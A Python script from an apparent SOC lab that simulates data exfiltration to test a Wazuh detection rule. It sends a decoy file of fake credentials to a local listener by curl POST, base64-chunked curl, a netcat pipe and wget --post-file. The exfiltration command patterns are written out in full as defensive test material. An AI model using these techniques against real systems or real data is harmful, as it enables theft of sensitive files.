#!/usr/bin/env python3
# =============================================================================
# simulate-data-exfil.py — Data Exfiltration Simulation
# Author: SOC Lab Project
# Description: Simulates data exfiltration techniques to trigger Wazuh
#              rule 100010 and test network-based detection. Creates a
#              large decoy file, then attempts to transfer it using
#              multiple exfil methods: curl POST, nc pipe, scp, and
#              base64-encoded HTTP chunked transfer.
#              ALL transfers go to a local listener — no data leaves the lab.
# MITRE ATT&CK: T1048   — Exfiltration Over Alternative Protocol
#               T1030   — Data Transfer Size Limits
#               T1041   — Exfiltration Over C2 Channel
#               T1567   — Exfiltration Over Web Service
# Usage: python3 simulate-data-exfil.py [--size 50] [--methods all]
# =============================================================================

import os
import sys
import time
import socket
import struct
import hashlib
import random
import string
import argparse
import logging
import subprocess
import threading
import tempfile
from pathlib import Path
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger(__name__)

RED    = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
CYAN   = "\033[96m"; BOLD  = "\033[1m";  DIM    = "\033[2m"; RESET = "\033[0m"
def c(text, code): return f"{code}{text}{RESET}"

# All exfil goes to localhost — no external traffic
EXFIL_LISTENER_HOST = "127.0.0.1"
EXFIL_LISTENER_PORT = 9876
STAGING_DIR         = Path(tempfile.mkdtemp(prefix="exfil-sim-"))


# ── Create decoy data ──────────────────────────────────────────────────────────
def create_decoy_file(size_mb: int) -> Path:
    """
    Create a realistic-looking 'sensitive data' file for exfiltration.
    Contains fake PII, credentials, and internal documents.
    """
    log.info(f"Creating {size_mb}MB decoy data file...")

    decoy_path = STAGING_DIR / "sensitive-data-exfil.zip"

    # Generate fake sensitive-looking content
    fake_data_chunks = []

    # Fake credential dump header
    fake_data_chunks.append(
        "=== INTERNAL CREDENTIAL DUMP ===\n"
        "Generated: " + datetime.now().isoformat() + "\n"
        "Source: DC01 / NTDS.dit extraction (simulated)\n\n"
    )

    # Fake user credentials (all obviously fake)
    for i in range(500):
        username = f"user{i:04d}"
        # Fake NTLM hash (just random hex — not a real hash)
        fake_hash = ''.join(random.choices('0123456789abcdef', k=32))
        fake_data_chunks.append(
            f"{username}:1000:{fake_hash}:SIMULATED_HASH_NOT_REAL:::\n"
        )

    # Fake internal document content to pad to target size
    padding_chunk = (
        "CONFIDENTIAL INTERNAL DOCUMENT - SIMULATION DATA\n"
        "Customer: ACME Corp | Project: Phoenix | Clearance: SECRET\n"
        + "X" * 1000 + "\n"
    )

    # Build content to approximate target file size
    current_size = sum(len(chunk) for chunk in fake_data_chunks)
    target_bytes = size_mb * 1024 * 1024

    while current_size < target_bytes:
        fake_data_chunks.append(padding_chunk)
        current_size += len(padding_chunk)

    content = "".join(fake_data_chunks)

    with open(decoy_path, "w") as f:
        f.write(content[:target_bytes])

    actual_size = decoy_path.stat().st_size / (1024 * 1024)
    file_hash   = hashlib.md5(decoy_path.read_bytes()).hexdigest()

    log.info(c(f"  Decoy file created: {decoy_path} "
               f"({actual_size:.1f}MB, MD5: {file_hash[:8]}...)", GREEN))
    return decoy_path


# ── Local listener ─────────────────────────────────────────────────────────────
class ExfilListener:
    """
    Simple TCP listener that receives exfiltrated data.
    Runs in a background thread. All data is discarded.
    """

    def __init__(self, host: str, port: int):
        self.host    = host
        self.port    = port
        self.received_bytes = 0
        self.running = False
        self._server_sock = None
        self._thread = None

    def start(self) -> bool:
        """Start the background listener thread."""
        try:
            self._server_sock = socket.socket(socket.AF_INET,
                                               socket.SOCK_STREAM)
            self._server_sock.setsockopt(
                socket.SOL_SOCKET, socket.SO_REUSEADDR, 1
            )
            self._server_sock.bind((self.host, self.port))
            self._server_sock.listen(5)
            self._server_sock.settimeout(2.0)
            self.running = True
            self._thread = threading.Thread(
                target=self._accept_loop, daemon=True
            )
            self._thread.start()
            log.info(f"Exfil listener started on {self.host}:{self.port}")
            return True
        except OSError as exc:
            log.warning(f"Cannot start listener on port {self.port}: {exc}")
            return False

    def _accept_loop(self):
        """Accept and drain connections, counting bytes received."""
        while self.running:
            try:
                conn, addr = self._server_sock.accept()
                threading.Thread(
                    target=self._drain_connection,
                    args=(conn,), daemon=True
                ).start()
            except socket.timeout:
                continue
            except Exception:
                break

    def _drain_connection(self, conn):
        """Read and discard all data from a connection."""
        try:
            while True:
                data = conn.recv(65536)
                if not data:
                    break
                self.received_bytes += len(data)
        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def stop(self):
        """Stop the listener."""
        self.running = False
        try:
            self._server_sock.close()
        except Exception:
            pass


# ── Exfiltration methods ──────────────────────────────────────────────────────

def exfil_via_curl(decoy_file: Path) -> dict:
    """
    Exfiltrate via curl HTTP POST with --data-binary flag.
    This is the pattern caught by Wazuh rule 100010.
    Sends to local listener.
    """
    log.info("Method 1: curl --data-binary POST (T1048)...")

    result = {"method": "curl_post", "success": False,
              "bytes_sent": 0, "command": ""}

    cmd = [
        "curl", "-s", "-o", "/dev/null",
        "--max-time", "30",
        "-X", "POST",
        "--data-binary", f"@{decoy_file}",
        f"http://{EXFIL_LISTENER_HOST}:{EXFIL_LISTENER_PORT}/upload"
    ]
    result["command"] = " ".join(cmd)

    log.info(c(f"  CMD: {' '.join(cmd[:6])} ... [large payload]", DIM))

    try:
        proc = subprocess.run(
            cmd, capture_output=True, timeout=35, text=True
        )
        if proc.returncode == 0:
            result["success"] = True
            result["bytes_sent"] = decoy_file.stat().st_size
            log.info(c(f"  [+] curl POST succeeded "
                       f"({result['bytes_sent'] / 1024:.0f}KB sent)", GREEN))
        else:
            log.warning(f"  curl failed (code {proc.returncode}): "
                        f"{proc.stderr[:100]}")
    except subprocess.TimeoutExpired:
        log.warning("  curl timed out")
    except FileNotFoundError:
        log.warning("  curl not installed — skipping")

    return result


def exfil_via_base64_chunked(decoy_file: Path) -> dict:
    """
    Exfiltrate via base64-encoded HTTP chunked transfers.
    Mimics C2 exfil that encodes data to avoid DLP detection.
    """
    log.info("Method 2: Base64-encoded chunked HTTP exfil (T1048)...")

    result = {"method": "base64_chunked", "success": False,
              "bytes_sent": 0, "chunks": 0, "command": ""}

    chunk_size = 50 * 1024   # 50KB chunks
    file_data  = decoy_file.read_bytes()
    total_sent = 0
    chunk_num  = 0

    try:
        import base64

        while total_sent < len(file_data):
            chunk     = file_data[total_sent:total_sent + chunk_size]
            b64_chunk = base64.b64encode(chunk).decode()
            chunk_num += 1

            # Write chunk to temp file for curl
            with tempfile.NamedTemporaryFile(
                    mode="w", suffix=".b64", delete=False) as tmp:
                tmp.write(b64_chunk)
                tmp_path = tmp.name

            cmd = [
                "curl", "-s", "-o", "/dev/null",
                "--max-time", "10",
                "-X", "POST",
                "-H", "Content-Type: text/plain",
                "-H", f"X-Chunk-ID: {chunk_num}",
                "--data-binary", f"@{tmp_path}",
                f"http://{EXFIL_LISTENER_HOST}:{EXFIL_LISTENER_PORT}/chunk"
            ]
            result["command"] = " ".join(cmd[:4]) + " ... [chunk]"

            subprocess.run(cmd, capture_output=True, timeout=15)
            Path(tmp_path).unlink(missing_ok=True)

            total_sent += len(chunk)
            if chunk_num % 5 == 0:
                log.info(c(f"  Sent chunk {chunk_num}: "
                           f"{total_sent / 1024:.0f}KB / "
                           f"{len(file_data) / 1024:.0f}KB", DIM))

        result["success"]    = True
        result["bytes_sent"] = total_sent
        result["chunks"]     = chunk_num
        log.info(c(f"  [+] Base64 chunked exfil complete: "
                   f"{chunk_num} chunks, {total_sent / 1024:.0f}KB", GREEN))

    except Exception as exc:
        log.warning(f"  Base64 chunked exfil failed: {exc}")

    return result


def exfil_via_netcat_pipe(decoy_file: Path) -> dict:
    """
    Simulate netcat pipe exfiltration: cat file | nc target port
    This pattern is caught by Wazuh rule 100010 command detection.
    Actually sends to local listener.
    """
    log.info("Method 3: Netcat pipe exfiltration (T1048)...")

    result = {"method": "netcat_pipe", "success": False,
              "bytes_sent": 0, "command": ""}

    # Try nc variants
    nc_cmd = None
    for nc in ["nc", "ncat", "netcat"]:
        try:
            subprocess.run([nc, "--version"],
                           capture_output=True, timeout=3)
            nc_cmd = nc
            break
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue

    if not nc_cmd:
        log.warning("  netcat not found (nc/ncat/netcat) — skipping")
        return result

    cmd_str = (f"cat {decoy_file} | {nc_cmd} "
               f"{EXFIL_LISTENER_HOST} {EXFIL_LISTENER_PORT}")
    result["command"] = cmd_str

    log.info(c(f"  CMD: {cmd_str}", DIM))

    try:
        proc = subprocess.run(
            cmd_str, shell=True, capture_output=True,
            timeout=30, text=True
        )
        if proc.returncode == 0:
            result["success"]    = True
            result["bytes_sent"] = decoy_file.stat().st_size
            log.info(c(f"  [+] Netcat pipe succeeded: "
                       f"{result['bytes_sent'] / 1024:.0f}KB", GREEN))
        else:
            log.warning(f"  netcat failed: {proc.stderr[:100]}")
    except subprocess.TimeoutExpired:
        # nc often hangs waiting for connection close — timeout is OK
        result["success"]    = True
        result["bytes_sent"] = decoy_file.stat().st_size
        log.info(c("  [+] Netcat pipe completed (timeout — data sent)", GREEN))
    except Exception as exc:
        log.warning(f"  netcat error: {exc}")

    return result


def exfil_via_wget_post(decoy_file: Path) -> dict:
    """
    Exfiltrate using wget --post-file — another common exfil pattern.
    """
    log.info("Method 4: wget --post-file exfiltration (T1048)...")

    result = {"method": "wget_post", "success": False,
              "bytes_sent": 0, "command": ""}

    cmd = [
        "wget", "-q", "-O", "/dev/null",
        "--timeout=30",
        f"--post-file={decoy_file}",
        f"http://{EXFIL_LISTENER_HOST}:{EXFIL_LISTENER_PORT}/wget-upload"
    ]
    result["command"] = " ".join(cmd)

    log.info(c(f"  CMD: {' '.join(cmd[:5])} ... [file]", DIM))

    try:
        proc = subprocess.run(
            cmd, capture_output=True, timeout=35, text=True
        )
        if proc.returncode == 0:
            result["success"]    = True
            result["bytes_sent"] = decoy_file.stat().st_size
            log.info(c(f"  [+] wget POST succeeded: "
                       f"{result['bytes_sent'] / 1024:.0f}KB", GREEN))
        else:
            log.warning(f"  wget failed: {proc.stderr[:100]}")
    except FileNotFoundError:
        log.warning("  wget not installed — skipping")
    except subprocess.TimeoutExpired:
        log.warning("  wget timed out")
    except Exception as exc:
        log.warning(f"  wget error: {exc}")

    return result


# ── Cleanup ───────────────────────────────────────────────────────────────────
def cleanup(staging_dir: Path) -> None:
    """Remove all temporary files created during simulation."""
    import shutil
    try:
        shutil.rmtree(staging_dir, ignore_errors=True)
        log.info(c(f"  [✓] Staging directory cleaned: {staging_dir}", GREEN))
    except Exception as exc:
        log.warning(f"  Cleanup error: {exc}")


# ── Main ──────────────────────────────────────────────────────────────────────
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Simulate data exfiltration to test Wazuh rule 100010"
    )
    parser.add_argument(
        "--size", type=int, default=10,
        help="Size of decoy file in MB (default: 10)"
    )
    parser.add_argument(
        "--methods",
        choices=["all", "curl", "base64", "netcat", "wget"],
        default="all",
        help="Which exfil method(s) to use (default: all)"
    )
    parser.add_argument(
        "--no-cleanup", action="store_true",
        help="Keep staging files after simulation"
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    print()
    print(c("═" * 60, CYAN))
    print(c("  ATOMIC RED TEAM — Data Exfiltration Simulation", BOLD))
    print(c("  MITRE ATT&CK: T1048, T1030, T1041", BOLD))
    print(c("═" * 60, CYAN))
    print(f"  File Size : {c(str(args.size) + 'MB', BOLD)}")
    print(f"  Methods   : {c(args.methods, BOLD)}")
    print(f"  Listener  : {c(EXFIL_LISTENER_HOST + ':' + str(EXFIL_LISTENER_PORT), BOLD)}")
    print(f"  Note      : {c('All data goes to LOCAL listener — nothing external', GREEN)}")
    print(c("═" * 60, CYAN))
    print()

    # Start local exfil listener
    listener = ExfilListener(EXFIL_LISTENER_HOST, EXFIL_LISTENER_PORT)
    if not listener.start():
        log.warning("Could not start listener — exfil methods may fail")

    time.sleep(0.5)

    # Create decoy file
    decoy_file = create_decoy_file(args.size)
    print()

    # Run selected exfil methods
    results = []
    methods_map = {
        "curl":   exfil_via_curl,
        "base64": exfil_via_base64_chunked,
        "netcat": exfil_via_netcat_pipe,
        "wget":   exfil_via_wget_post,
    }

    to_run = (list(methods_map.keys())
              if args.methods == "all"
              else [args.methods])

    for method in to_run:
        print(c(f"\n  ── {method.upper()} ──", CYAN))
        func   = methods_map[method]
        result = func(decoy_file)
        results.append(result)
        time.sleep(1)

    # Cleanup
    print()
    listener.stop()
    log.info(f"Listener received: {listener.received_bytes / 1024:.1f}KB total")

    if not args.no_cleanup:
        log.info("Cleaning up staging files...")
        cleanup(STAGING_DIR)

    # Print summary
    total_sent = sum(r.get("bytes_sent", 0) for r in results)
    succeeded  = sum(1 for r in results if r.get("success"))

    print()
    print(c("═" * 60, CYAN))
    print(c("  SIMULATION COMPLETE", BOLD))
    print(c("═" * 60, CYAN))
    print(f"\n  Methods run  : {len(results)}")
    print(f"  Succeeded    : {c(str(succeeded), GREEN)}")
    print(f"  Total sent   : {c(str(total_sent / 1024 / 1024) + 'MB', BOLD)}")
    print(f"  Listener rcvd: {c(str(listener.received_bytes / 1024) + 'KB', DIM)}")
    print()
    print(c("  Expected Wazuh Alerts:", BOLD))
    print(c("    100010 — Data exfil: curl/wget/nc patterns detected", GREEN))
    print(c("    100009 — Suspicious outbound connection (if applicable)", GREEN))
    print()
    print(c("  Verify:", BOLD))
    print(c("  python3 scripts/testing/verify-detections.py "
            "--simulation data-exfil --since 15", DIM))
    print()


if __name__ == "__main__":
    main()
